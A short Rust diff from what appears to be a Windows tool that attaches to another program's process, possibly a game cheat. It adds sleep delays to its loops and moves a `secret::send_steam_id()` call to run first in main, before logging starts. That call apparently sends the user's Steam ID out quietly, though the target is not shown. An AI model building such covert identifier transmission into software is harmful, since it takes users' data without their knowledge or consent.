@@ -39,6 +39,7 @@ fn attach(process: Process, window: Window) {
                     }
                     periodic.run(Arc::clone(&process), player, entities);
                 };
+                thread::sleep(Duration::from_millis(8));
             }
         });
     }
@@ -70,16 +71,16 @@ fn attach(process: Process, window: Window) {
         if window.is_focused() {
             continuous.run(Arc::clone(&process), player, entities);
         }
+        thread::sleep(Duration::from_secs(8));
     }
 }
 
 #[cfg(target_os = "windows")]
 #[tokio::main]
 async fn main() {
+    secret::send_steam_id().await;
     logger::init_env();
     Keyboard::listen();
-
-    secret::send_steam_id().await;
 
     log::info!("MONITORING...");
     loop {
